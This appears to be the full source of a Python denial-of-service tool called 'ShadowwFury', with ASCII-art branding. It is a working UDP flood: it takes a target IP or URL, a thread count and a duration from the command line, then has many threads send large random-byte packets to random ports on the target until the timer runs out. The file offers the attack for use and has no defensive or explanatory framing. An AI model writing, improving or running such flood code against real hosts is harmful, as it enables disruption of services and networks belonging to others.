import socket
import time
import random
import threading
import sys
from colorama import Fore
import re

_ver_ = 'v1.0.2'

print(rf"""{Fore.RED}

██████  ██░ ██  ▄▄▄      ▓█████▄  ▒█████   █     █░ █     █░  █████▒█    ██  ██▀███ ▓██   ██▓
▒██    ▒ ▓██░ ██▒▒████▄    ▒██▀ ██▌▒██▒  ██▒▓█░ █ ░█░▓█░ █ ░█░▓██   ▒ ██  ▓██▒▓██ ▒ ██▒▒██  ██▒
░ ▓██▄   ▒██▀▀██░▒██  ▀█▄  ░██   █▌▒██░  ██▒▒█░ █ ░█ ▒█░ █ ░█ ▒████ ░▓██  ▒██░▓██ ░▄█ ▒ ▒██ ██░
  ▒   ██▒░▓█ ░██ ░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░░█░ █ ░█ ░█░ █ ░█ ░▓█▒  ░▓▓█  ░██░▒██▀▀█▄   ░ ▐██▓░
▒██████▒▒░▓█▒░██▓ ▓█   ▓██▒░▒████▓ ░ ████▓▒░░░██▒██▓ ░░██▒██▓ ░▒█░   ▒▒█████▓ ░██▓ ▒██▒ ░ ██▒▓░
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒  ░ ▓░▒ ▒   ▒ ░   ░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░  ██▒▒▒ 
░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░   ▒ ░ ░    ▒ ░ ░   ░     ░░▒░ ░ ░   ░▒ ░ ▒░▓██ ░▒░ 
░  ░  ░   ░  ░░ ░  ░   ▒    ░ ░  ░ ░ ░ ░ ▒    ░   ░    ░   ░   ░ ░    ░░░ ░ ░   ░░   ░ ▒ ▒ ░░  
      ░   ░  ░  ░      ░  ░   ░        ░ ░      ░        ░              ░        ░     ░ ░     
                              ░ ShadowwFury by nateyy, version {_ver_}                 ░ ░     
      

      
{Fore.RESET}""")

def get_ip_address(url):
    try:
        ip_address = socket.gethostbyname(url)
        return ip_address
    except socket.error as e:
        print(f"Error: {e}")
        return None

try:
    Target, Method, Threads, Timer = str(sys.argv[1]), str(sys.argv[2]), int(sys.argv[3]), float(sys.argv[4])

except IndexError:
    print(Fore.GREEN + '\n[+] Usage: python3 ' + sys.argv[0] + '<Target IP adress/URL> <Method UDP> <Threads> <Timer in second>')
try:
    if Method == 'UDP':
        try: 
            Timeout = time.time() + 1 * Timer
        except Exception:
            exit()

        def is_valid_ip(ip):
            ip_pattern = r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$'
            return re.match(ip_pattern, ip) is not None

        def is_valid_url(url):
            url_pattern = r'^(https?://)?([A-Za-z_0-9.-]+)(:[0-9]+)?(\/.*)?$'
            return re.match(url_pattern, url) is not None

        def check_input(Target):
            if is_valid_ip(Target):
                Attack()
            elif is_valid_url(Target):

                url = Target
                ip_address = get_ip_address(url)

                if ip_address is not None:
                    Attack()
                elif ip_address is None:
                    print(Fore.RED + f'[-] The Hosts IP adress could not be resolved!')
                    time.sleep(15)
                    exit()

        def Attack():
            try:
                Bytes = random._urandom(1024)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while time.time() < Timeout:
                    dport = random.randint(22, 65535)
                    sock.sendto(Bytes * random.randint(5, 22), (Target, dport))
            except ConnectionRefusedError:
                print(Fore.GREEN + f'[+] Target {Target} is offline or unreachable')
            except Exception as Error:
                print(Fore.RED + f'[-] {Error}')
            except KeyboardInterrupt:
                exit()

        print(Fore.GREEN + '\n[+] Target Attack...')
        try:
            for _ in range(0, Threads):
                threading.Thread(target=Attack).start()
        except Exception as error:
            print(Fore.RED + f"[-] {error}")
        except KeyboardInterrupt:
            exit()

except Exception:
    exit()
except KeyboardInterrupt:
    exit()